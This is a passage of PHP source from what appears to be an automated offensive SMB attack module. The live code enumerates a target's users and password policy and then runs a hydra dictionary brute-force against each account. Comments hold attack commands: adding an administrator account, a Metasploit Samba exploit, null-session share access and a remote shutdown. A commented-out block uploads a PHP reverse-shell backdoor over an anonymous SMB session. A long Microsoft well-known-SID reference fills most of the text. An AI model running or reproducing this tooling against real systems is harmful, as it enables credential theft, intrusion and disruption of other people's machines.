        $this->service2smb4query($work_group,$user2name, $user2pass,"querydominfo","");$this->pause();
        $this->service2smb4query($work_group,$user2name, $user2pass,"getusername","");$this->pause();
        $this->service2smb4query($work_group,$user2name, $user2pass,"enum","");$this->pause();
        $this->service2smb4query($work_group,$user2name, $user2pass,"getusername","");$this->pause();
        
        $this->service2smb4os($work_group,$user2name, $user2pass);$this->pause();
        
       
        $users = array_unique($users);
        //var_dump($users);$this->pause();
        if(!empty($users))
            foreach ($users as $user){
                if(!empty($user)){
                    $this->article("USER", $user[0]);
                    //var_dump($user);$this->pause();
                    $this->service2smb4query($work_group,$user2name, $user2pass,"queryuser $user[0]","");
                    $query = "hydra -l \"$user[0]\" -P \"$this->dico_password.1000\" $this->ip smb -t 8 -e nsr -s $this->port -w 5s 2>/dev/null  | grep -i  'login:' ";
                    $this->auth2login4hydra($this->req_ret_str($query));
                }
        }
        
        $this->ssTitre("Attempting to get printer info");
        $this->service2smb4query($work_group,$user2name, $user2pass,"enumprinters","");
        
        $this->ssTitre("Attempting to get Domain Password Policy info");
        $this->service2smb4query($work_group,$user2name, $user2pass,"getdompwinfo","");
        
        $this->ssTitre("Attempting to get user Password Policy info");
        $this->service2smb4query($work_group,$user2name, $user2pass,"getusrpwinfo","");
        
        // S-1-5-21
        // https://msdn.microsoft.com/en-us/library/windows/desktop/aa379649(v=vs.85).aspx
        /*
        
        whoami \u2013 List the current user
        net share \u2013 View current network shares
        net use X: \\IP_Address\c$ \u2013 Mount a remote network share
        net localgroup \u2013 Retrieve the local groups
        net localgroup Administrators \u2013 Retrieve local administrators
        net user pentestuser pentestpass /add \u2013 Add a new user to the current host
        net localgroup Administrators pentestuser /add \u2013 Add pentestuser to the local administrators group
        net user pentestuser /domain \u2013 View information about a domain user
        net group \u201cDomain Admins\u201d /domain \u2013 Retrieve domain administrators
        net config server/workstation \u2013 View the domain name of current host
        net view \u2013 List all hosts in the current workgroup or domain
        net view /domain \u2013 List all domains available
        net user /domain \u2013 List all the domain users
        
        on msf2 :
        use auxiliary/scanner/smb/smb_version
        use auxiliary/admin/smb/samba_symlink_traversal
        Using smbclient will access the root filesystem using anonymous connection.
        root@wizard32:~# smbclient //192.168.56.101/tmp
        use exploit/multi/samba/usermap_script
        
        rpcinfo -p 192.168.1.112
        showmount -e 192.168.1.112
        
        wmic useraccount get name,sid
        wmic useraccount where name="USER" get sid
        wmic useraccount where name='%username%' get sid
        
        Get SID for the local administrator of the computer
        wmic useraccount where (name='administrator' and domain='%computername%') get name,sid
        
        Get SID for the domain administrator
        wmic useraccount where (name='administrator' and domain='%userdomain%') get name,sid
        
        Find username from a SID
        wmic useraccount where sid='S-1-3-12-1234525106-3567804255-30012867-1437' get name
        
        Other useful commands:
        
        wmic sysaccount get domain,name,sid \u2013 list built-in accounts
        
        wmic group get domain,name,sid \u2013 list Active Directory groups
        
        net user <username> \u2013 list all info for one user
        
        net localgroup Administrators \u2013 list users in the local Administrators group
        
        
        
        wmic useraccount where sid="S-1-5-21-1180699209-877415012-3182924384-1004" get name
        
        
        You can also determine a user's SID by looking through the ProfileImagePath values in each S-1-5-21 prefixed SID listed under this key:
        
        HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList
        
        c:\>whoami /user
        USER INFORMATION
        ----------------
        User Name      SID
        ============== ==============================================
        mydomain\wincmd S-1-5-21-7375663-6890924511-1272660413-2944159
        
        
        
        
        
        
        https://support.microsoft.com/en-us/help/243330/well-known-security-identifiers-in-windows-operating-systems
        
        The following are well-known SIDs:
        
        SID: S-1-0
        Name: Null Authority
        Description: An identifier authority.
        SID: S-1-0-0
        Name: Nobody
        Description: No security principal.
        SID: S-1-1
        Name: World Authority
        Description: An identifier authority.
        SID: S-1-1-0
        Name: Everyone
        Description: A group that includes all users, even anonymous users and guests. Membership is controlled by the operating system.
        
        Note By default, the Everyone group no longer includes anonymous users on a computer that is running Windows XP Service Pack 2 (SP2).
        SID: S-1-2
        Name: Local Authority
        Description: An identifier authority.
        SID: S-1-2-0
        
        Name: Local
        
        Description: A group that includes all users who have logged on locally.
        SID: S-1-2-1
        
        Name: Console Logon
        
        Description: A group that includes users who are logged on to the physical console.
        
        Note Added in Windows 7 and Windows Server 2008 R2
        SID: S-1-3
        Name: Creator Authority
        Description: An identifier authority.
        SID: S-1-3-0
        Name: Creator Owner
        Description: A placeholder in an inheritable access control entry (ACE). When the ACE is inherited, the system replaces this SID with the SID for the object's creator.
        SID: S-1-3-1
        Name: Creator Group
        Description: A placeholder in an inheritable ACE. When the ACE is inherited, the system replaces this SID with the SID for the primary group of the object's creator. The primary group is used only by the POSIX subsystem.
        SID: S-1-3-2
        Name: Creator Owner Server
        Description: This SID is not used in Windows 2000.
        SID: S-1-3-3
        Name: Creator Group Server
        Description: This SID is not used in Windows 2000.
        SID: S-1-3-4 Name: Owner Rights
        
        Description: A group that represents the current owner of the object. When an ACE that carries this SID is applied to an object, the system ignores the implicit READ_CONTROL and WRITE_DAC permissions for the object owner.
        SID: S-1-5-80-0
        Name: All Services
        Description: A group that includes all service processes configured on the system. Membership is controlled by the operating system.
        
        Note Added in Windows Vista and Windows Server 2008
        SID: S-1-4
        Name: Non-unique Authority
        Description: An identifier authority.
        SID: S-1-5
        Name: NT Authority
        Description: An identifier authority.
        SID: S-1-5-1
        Name: Dialup
        Description: A group that includes all users who have logged on through a dial-up connection. Membership is controlled by the operating system.
        SID: S-1-5-2
        Name: Network
        Description: A group that includes all users that have logged on through a network connection. Membership is controlled by the operating system.
        SID: S-1-5-3
        Name: Batch
        Description: A group that includes all users that have logged on through a batch queue facility. Membership is controlled by the operating system.
        SID: S-1-5-4
        Name: Interactive
        Description: A group that includes all users that have logged on interactively. Membership is controlled by the operating system.
        SID: S-1-5-5-X-Y
        Name: Logon Session
        Description: A logon session. The X and Y values for these SIDs are different for each session.
        SID: S-1-5-6
        Name: Service
        Description: A group that includes all security principals that have logged on as a service. Membership is controlled by the operating system.
        SID: S-1-5-7
        Name: Anonymous
        Description: A group that includes all users that have logged on anonymously. Membership is controlled by the operating system.
        SID: S-1-5-8
        Name: Proxy
        Description: This SID is not used in Windows 2000.
        SID: S-1-5-9
        Name: Enterprise Domain Controllers
        Description: A group that includes all domain controllers in a forest that uses an Active Directory directory service. Membership is controlled by the operating system.
        SID: S-1-5-10
        Name: Principal Self
        Description: A placeholder in an inheritable ACE on an account object or group object in Active Directory. When the ACE is inherited, the system replaces this SID with the SID for the security principal who holds the account.
        SID: S-1-5-11
        Name: Authenticated Users
        Description: A group that includes all users whose identities were authenticated when they logged on. Membership is controlled by the operating system.
        SID: S-1-5-12
        Name: Restricted Code
        Description: This SID is reserved for future use.
        SID: S-1-5-13
        Name: Terminal Server Users
        Description: A group that includes all users that have logged on to a Terminal Services server. Membership is controlled by the operating system.
        SID: S-1-5-14
        Name: Remote Interactive Logon
        Description: A group that includes all users who have logged on through a terminal services logon.
        SID: S-1-5-15
        Name: This Organization
        Description: A group that includes all users from the same organization. Only included with AD accounts and only added by a Windows Server 2003 or later domain controller.
        SID: S-1-5-17
        Name: This Organization
        Description: An account that is used by the default Internet Information Services (IIS) user.
        SID: S-1-5-18
        Name: Local System
        Description: A service account that is used by the operating system.
        SID: S-1-5-19
        Name: NT Authority
        Description: Local Service
        SID: S-1-5-20
        Name: NT Authority
        Description: Network Service
        SID: S-1-5-21domain-500
        Name: Administrator
        Description: A user account for the system administrator. By default, it is the only user account that is given full control over the system.
        SID: S-1-5-21domain-501
        Name: Guest
        Description: A user account for people who do not have individual accounts. This user account does not require a password. By default, the Guest account is disabled.
        SID: S-1-5-21domain-502
        Name: KRBTGT
        Description: A service account that is used by the Key Distribution Center (KDC) service.
        SID: S-1-5-21domain-512
        Name: Domain Admins
        Description: A global group whose members are authorized to administer the domain. By default, the Domain Admins group is a member of the Administrators group on all computers that have joined a domain, including the domain controllers. Domain Admins is the default owner of any object that is created by any member of the group.
        SID: S-1-5-21domain-513
        Name: Domain Users
        Description: A global group that, by default, includes all user accounts in a domain. When you create a user account in a domain, it is added to this group by default.
        SID: S-1-5-21domain-514
        Name: Domain Guests
        Description: A global group that, by default, has only one member, the domain's built-in Guest account.
        SID: S-1-5-21domain-515
        Name: Domain Computers
        Description: A global group that includes all clients and servers that have joined the domain.
        SID: S-1-5-21domain-516
        Name: Domain Controllers
        Description: A global group that includes all domain controllers in the domain. New domain controllers are added to this group by default.
        SID: S-1-5-21domain-517
        Name: Cert Publishers
        Description: A global group that includes all computers that are running an enterprise certification authority. Cert Publishers are authorized to publish certificates for User objects in Active Directory.
        SID: S-1-5-21root domain-518
        Name: Schema Admins
        Description: A universal group in a native-mode domain; a global group in a mixed-mode domain. The group is authorized to make schema changes in Active Directory. By default, the only member of the group is the Administrator account for the forest root domain.
        SID: S-1-5-21root domain-519
        Name: Enterprise Admins
        Description: A universal group in a native-mode domain; a global group in a mixed-mode domain. The group is authorized to make forest-wide changes in Active Directory, such as adding child domains. By default, the only member of the group is the Administrator account for the forest root domain.
        SID: S-1-5-21domain-520
        Name: Group Policy Creator Owners
        Description: A global group that is authorized to create new Group Policy objects in Active Directory. By default, the only member of the group is Administrator.
        SID: S-1-5-21domain-526
        Name: Key Admins
        Description: A security group. The intention for this group is to have delegated write access on the msdsKeyCredentialLink attribute only. The group is intended for use in scenarios where trusted external authorities (for example, Active Directory Federated Services) are responsible for modifying this attribute. Only trusted administrators should be made a member of this group.
        SID: S-1-5-21domain-527
        Name: Enterprise Key Admins
        Description: A security group. The intention for this group is to have delegated write access on the msdsKeyCredentialLink attribute only. The group is intended for use in scenarios where trusted external authorities (for example, Active Directory Federated Services) are responsible for modifying this attribute. Only trusted administrators should be made a member of this group.
        SID: S-1-5-21domain-553
        Name: RAS and IAS Servers
        Description: A domain local group. By default, this group has no members. Servers in this group have Read Account Restrictions and Read Logon Information access to User objects in the Active Directory domain local group.
        SID: S-1-5-32-544
        Name: Administrators
        Description: A built-in group. After the initial installation of the operating system, the only member of the group is the Administrator account. When a computer joins a domain, the Domain Admins group is added to the Administrators group. When a server becomes a domain controller, the Enterprise Admins group also is added to the Administrators group.
        SID: S-1-5-32-545
        Name: Users
        Description: A built-in group. After the initial installation of the operating system, the only member is the Authenticated Users group. When a computer joins a domain, the Domain Users group is added to the Users group on the computer.
        SID: S-1-5-32-546
        Name: Guests
        Description: A built-in group. By default, the only member is the Guest account. The Guests group allows occasional or one-time users to log on with limited privileges to a computer's built-in Guest account.
        SID: S-1-5-32-547
        Name: Power Users
        Description: A built-in group. By default, the group has no members. Power users can create local users and groups; modify and delete accounts that they have created; and remove users from the Power Users, Users, and Guests groups. Power users also can install programs; create, manage, and delete local printers; and create and delete file shares.
        SID: S-1-5-32-548
        Name: Account Operators
        Description: A built-in group that exists only on domain controllers. By default, the group has no members. By default, Account Operators have permission to create, modify, and delete accounts for users, groups, and computers in all containers and organizational units of Active Directory except the Builtin container and the Domain Controllers OU. Account Operators do not have permission to modify the Administrators and Domain Admins groups, nor do they have permission to modify the accounts for members of those groups.
        SID: S-1-5-32-549
        Name: Server Operators
        Description: A built-in group that exists only on domain controllers. By default, the group has no members. Server Operators can log on to a server interactively; create and delete network shares; start and stop services; back up and restore files; format the hard disk of the computer; and shut down the computer.
        SID: S-1-5-32-550
        Name: Print Operators
        Description: A built-in group that exists only on domain controllers. By default, the only member is the Domain Users group. Print Operators can manage printers and document queues.
        SID: S-1-5-32-551
        Name: Backup Operators
        Description: A built-in group. By default, the group has no members. Backup Operators can back up and restore all files on a computer, regardless of the permissions that protect those files. Backup Operators also can log on to the computer and shut it down.
        SID: S-1-5-32-552
        Name: Replicators
        Description: A built-in group that is used by the File Replication service on domain controllers. By default, the group has no members. Do not add users to this group.
        SID: S-1-5-64-10
        Name: NTLM Authentication
        Description: A SID that is used when the NTLM authentication package authenticated the client
        SID: S-1-5-64-14
        Name: SChannel Authentication
        Description: A SID that is used when the SChannel authentication package authenticated the client.
        SID: S-1-5-64-21
        Name: Digest Authentication
        Description: A SID that is used when the Digest authentication package authenticated the client.
        SID: S-1-5-80
        Name: NT Service
        Description: An NT Service account prefix
        SID: S-1-5-80-0
        SID S-1-5-80-0 = NT SERVICES\ALL SERVICES
        Name: All Services
        Description: A group that includes all service processes that are configured on the system. Membership is controlled by the operating system.
        
        Note Added in Windows Server 2008 R2
        SID: S-1-5-83-0
        Name: NT VIRTUAL MACHINE\Virtual Machines
        Description: A built-in group. The group is created when the Hyper-V role is installed. Membership in the group is maintained by the Hyper-V Management Service (VMMS). This group requires the "Create Symbolic Links" right (SeCreateSymbolicLinkPrivilege), and also the "Log on as a Service" right (SeServiceLogonRight).
        
        Note Added in Windows 8 and Windows Server 2012
        SID: S-1-16-0
        Name: Untrusted Mandatory Level
        Description: An untrusted integrity level. Note Added in Windows Vista and Windows Server 2008
        
        Note Added in Windows Vista and Windows Server 2008
        SID: S-1-16-4096
        Name: Low Mandatory Level
        Description: A low integrity level.
        
        Note Added in Windows Vista and Windows Server 2008
        SID: S-1-16-8192
        Name: Medium Mandatory Level
        Description: A medium integrity level.
        
        Note Added in Windows Vista and Windows Server 2008
        SID: S-1-16-8448
        Name: Medium Plus Mandatory Level
        Description: A medium plus integrity level.
        
        Note Added in Windows Vista and Windows Server 2008
        SID: S-1-16-12288
        Name: High Mandatory Level
        Description: A high integrity level.
        
        Note Added in Windows Vista and Windows Server 2008
        SID: S-1-16-16384
        Name: System Mandatory Level
        Description: A system integrity level.
        
        Note Added in Windows Vista and Windows Server 2008
        SID: S-1-16-20480
        Name: Protected Process Mandatory Level
        Description: A protected-process integrity level.
        
        Note Added in Windows Vista and Windows Server 2008
        SID: S-1-16-28672
        Name: Secure Process Mandatory Level
        Description: A secure process integrity level.
        
        Note Added in Windows Vista and Windows Server 2008
        
        The following groups appear as SIDs until a Windows Server 2003 domain controller is made the primary domain controller (PDC) operations master role holder. The "operations master" is also known as flexible single master operations (FSMO). The following additional built-in groups are created when a Windows Server 2003 domain controller is added to the domain:
        
        SID: S-1-5-32-554
        Name: BUILTIN\Pre-Windows 2000 Compatible Access
        Description: An alias added by Windows 2000. A backward compatibility group which allows read access on all users and groups in the domain.
        SID: S-1-5-32-555
        Name: BUILTIN\Remote Desktop Users
        Description: An alias. Members in this group are granted the right to logon remotely.
        SID: S-1-5-32-556
        Name: BUILTIN\Network Configuration Operators
        Description: An alias. Members in this group can have some administrative privileges to manage configuration of networking features.
        SID: S-1-5-32-557
        Name: BUILTIN\Incoming Forest Trust Builders
        Description: An alias. Members of this group can create incoming, one-way trusts to this forest.
        SID: S-1-5-32-558
        Name: BUILTIN\Performance Monitor Users
        Description: An alias. Members of this group have remote access to monitor this computer.
        SID: S-1-5-32-559
        Name: BUILTIN\Performance Log Users
        Description: An alias. Members of this group have remote access to schedule logging of performance counters on this computer.
        SID: S-1-5-32-560
        Name: BUILTIN\Windows Authorization Access Group
        Description: An alias. Members of this group have access to the computed tokenGroupsGlobalAndUniversal attribute on User objects.
        SID: S-1-5-32-561
        Name: BUILTIN\Terminal Server License Servers
        Description: An alias. A group for Terminal Server License Servers. When Windows Server 2003 Service Pack 1 is installed, a new local group is created.
        SID: S-1-5-32-562
        Name: BUILTIN\Distributed COM Users
        Description: An alias. A group for COM to provide computerwide access controls that govern access to all call, activation, or launch requests on the computer.
        
        
        The following groups appear as SIDs until a Windows Server 2008 or Windows Server 2008 R2 domain controller is made the primary domain controller (PDC) operations master role holder. The "operations master" is also known as flexible single master operations (FSMO). The following additional built-in groups are created when a Windows Server 2008 or Windows Server 2008 R2 domain controller is added to the domain:
        
        SID: S-1-5- 21domain -498
        Name: Enterprise Read-only Domain Controllers
        Description: A Universal group. Members of this group are Read-Only Domain Controllers in the enterprise
        SID: S-1-5- 21domain -521
        Name: Read-only Domain Controllers
        Description: A Global group. Members of this group are Read-Only Domain Controllers in the domain
        SID: S-1-5-32-569
        Name: BUILTIN\Cryptographic Operators
        Description: A Builtin Local group. Members are authorized to perform cryptographic operations.
        SID: S-1-5-21 domain -571
        Name: Allowed RODC Password Replication Group
        Description: A Domain Local group. Members in this group can have their passwords replicated to all read-only domain controllers in the domain.
        SID: S-1-5- 21 domain -572
        Name: Denied RODC Password Replication Group
        Description: A Domain Local group. Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
        SID: S-1-5-32-573
        Name: BUILTIN\Event Log Readers
        Description: A Builtin Local group. Members of this group can read event logs from local machine.
        SID: S-1-5-32-574
        Name: BUILTIN\Certificate Service DCOM Access
        Description: A Builtin Local group. Members of this group are allowed to connect to Certification Authorities in the enterprise.
        
        The following groups appear as SIDs until a Windows Server 2012 domain controller is made the primary domain controller (PDC) operations master role holder. The "operations master" is also known as flexible single master operations (FSMO). The following additional built-in groups are created when a Windows Server 2012 domain controller is added to the domain:
        
        SID: S-1-5-21-domain-522
        Name: Cloneable Domain Controllers
        Description: A Global group. Members of this group that are domain controllers may be cloned.
        SID: S-1-5-32-575
        Name: BUILTIN\RDS Remote Access Servers
        Description: A Builtin Local group. Servers in this group enable users of RemoteApp programs and personal virtual desktops access to these resources. In Internet-facing deployments, these servers are typically deployed in an edge network. This group needs to be populated on servers running RD Connection Broker. RD Gateway servers and RD Web Access servers used in the deployment need to be in this group.
        SID: S-1-5-32-576
        Name: BUILTIN\RDS Endpoint Servers
        Description: A Builtin Local group. Servers in this group run virtual machines and host sessions where users RemoteApp programs and personal virtual desktops run. This group needs to be populated on servers running RD Connection Broker. RD Session Host servers and RD Virtualization Host servers used in the deployment need to be in this group.
        SID: S-1-5-32-577
        Name: BUILTIN\RDS Management Servers
        Description: A Builtin Local group. Servers in this group can perform routine administrative actions on servers running Remote Desktop Services. This group needs to be populated on all servers in a Remote Desktop Services deployment. The servers running the RDS Central Management service must be included in this group.
        SID: S-1-5-32-578
        Name: BUILTIN\Hyper-V Administrators
        Description: A Builtin Local group. Members of this group have complete and unrestricted access to all features of Hyper-V.
        SID: S-1-5-32-579
        Name: BUILTIN\Access Control Assistance Operators
        Description: A Builtin Local group. Members of this group can remotely query authorization attributes and permissions for resources on this computer.
        SID: S-1-5-32-580
        Name: BUILTIN\Remote Management Users
        Description: A Builtin Local group. Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
        
        */
        
        
        
        //$this->req_ret_str("medusa -h $this->ip -M smbnt ");
        $this->note("The net use  \\[target_IP]\C$ [admin password] /u:[admin name] will establish an administrative session with the target (Windows NT/2000
system.
		It is not used to gain an interactive shell (which requires much more than the administrative password) or to map a drive");
        $this->cmd("Win", "C:\> net use * \\ [targetIP]\[share] [password] /u:[user]
				C:\>net use \\IP_Address\IPC \"\"/u:\"\"
				C:\>net view \\IP_Address -> will show you list of shares, computers, devices, etc.
				net rpc SHUTDOWN -C 'Comment here' -f -I xxx.xxx.xxx.xxx -U username%password
				");
        
        
        
        /*
         $backdoor_php = new FILE("$this->dir_tmp/backdoor_php.php");
         $backdoor_php->backdoor_com_php_simple_reverse($this->prof, 9999);
         $this->req_ret_str("smbclient //$this->ip/IPC$ -N -U -t 1 -c \"put $backdoor_php->file_path \" ");
         */
        
        return $result;
        /*
         typedef enum  {
         WinNullSid                                   = 0,
         WinWorldSid                                  = 1,
         WinLocalSid                                  = 2,
         WinCreatorOwnerSid                           = 3,
         WinCreatorGroupSid                           = 4,
         WinCreatorOwnerServerSid                     = 5,
         WinCreatorGroupServerSid                     = 6,
         WinNtAuthoritySid                            = 7,
         WinDialupSid                                 = 8,
         WinNetworkSid                                = 9,
         WinBatchSid                                  = 10,
         WinInteractiveSid                            = 11,
         WinServiceSid                                = 12,
         WinAnonymousSid                              = 13,
         WinProxySid                                  = 14,
         WinEnterpriseControllersSid                  = 15,
         WinSelfSid                                   = 16,
         WinAuthenticatedUserSid                      = 17,
         WinRestrictedCodeSid                         = 18,
         WinTerminalServerSid                         = 19,
         WinRemoteLogonIdSid                          = 20,
         WinLogonIdsSid                               = 21,
         WinLocalSystemSid                            = 22,
         WinLocalServiceSid                           = 23,
         WinNetworkServiceSid                         = 24,
         WinBuiltinDomainSid                          = 25,
         WinBuiltinAdministratorsSid                  = 26,
         WinBuiltinUsersSid                           = 27,
         WinBuiltinGuestsSid                          = 28,
         WinBuiltinPowerUsersSid                      = 29,
         WinBuiltinAccountOperatorsSid                = 30,
         WinBuiltinSystemOperatorsSid                 = 31,
         WinBuiltinPrintOperatorsSid                  = 32,
         WinBuiltinBackupOperatorsSid                 = 33,
         WinBuiltinReplicatorSid                      = 34,
         WinBuiltinPreWindows2000CompatibleAccessSid  = 35,
         WinBuiltinRemoteDesktopUsersSid              = 36,
         WinBuiltinNetworkConfigurationOperatorsSid   = 37,
         WinAccountAdministratorSid                   = 38,
         WinAccountGuestSid                           = 39,
         WinAccountKrbtgtSid                          = 40,
         WinAccountDomainAdminsSid                    = 41,
         WinAccountDomainUsersSid                     = 42,
         WinAccountDomainGuestsSid                    = 43,
         WinAccountComputersSid                       = 44,
         WinAccountControllersSid                     = 45,
         WinAccountCertAdminsSid                      = 46,
         WinAccountSchemaAdminsSid                    = 47,
         WinAccountEnterpriseAdminsSid                = 48,
         WinAccountPolicyAdminsSid                    = 49,
         WinAccountRasAndIasServersSid                = 50,
         WinNTLMAuthenticationSid                     = 51,
         WinDigestAuthenticationSid                   = 52,
         WinSChannelAuthenticationSid                 = 53,
         WinThisOrganizationSid                       = 54,
         WinOtherOrganizationSid                      = 55,
         WinBuiltinIncomingForestTrustBuildersSid     = 56,
         WinBuiltinPerfMonitoringUsersSid             = 57,
         WinBuiltinPerfLoggingUsersSid                = 58,
         WinBuiltinAuthorizationAccessSid             = 59,
         WinBuiltinTerminalServerLicenseServersSid    = 60,
         WinBuiltinDCOMUsersSid                       = 61,
         WinBuiltinIUsersSid                          = 62,
         WinIUserSid                                  = 63,
         WinBuiltinCryptoOperatorsSid                 = 64,
         WinUntrustedLabelSid                         = 65,
         WinLowLabelSid                               = 66,
         WinMediumLabelSid                            = 67,
         WinHighLabelSid                              = 68,
         WinSystemLabelSid                            = 69,
         WinWriteRestrictedCodeSid                    = 70,
         WinCreatorOwnerRightsSid                     = 71,
         WinCacheablePrincipalsGroupSid               = 72,
         WinNonCacheablePrincipalsGroupSid            = 73,
         WinEnterpriseReadonlyControllersSid          = 74,
         WinAccountReadonlyControllersSid             = 75,
         WinBuiltinEventLogReadersGroup               = 76,
         WinNewEnterpriseReadonlyControllersSid       = 77,
         WinBuiltinCertSvcDComAccessGroup             = 78,
         WinMediumPlusLabelSid                        = 79,
         WinLocalLogonSid                             = 80,
         WinConsoleLogonSid                           = 81,
         WinThisOrganizationCertificateSid            = 82,
         WinApplicationPackageAuthoritySid            = 83,
         WinBuiltinAnyPackageSid                      = 84,
         WinCapabilityInternetClientSid               = 85,
         WinCapabilityInternetClientServerSid         = 86,
         WinCapabilityPrivateNetworkClientServerSid   = 87,
         WinCapabilityPicturesLibrarySid              = 88,
         WinCapabilityVideosLibrarySid                = 89,
         WinCapabilityMusicLibrarySid                 = 90,
         WinCapabilityDocumentsLibrarySid             = 91,
         WinCapabilitySharedUserCertificatesSid       = 92,
         WinCapabilityEnterpriseAuthenticationSid     = 93,
         WinCapabilityRemovableStorageSid             = 94
         } WELL_KNOWN_SID_TYPE;
         */
    }
    
    



  }
?>
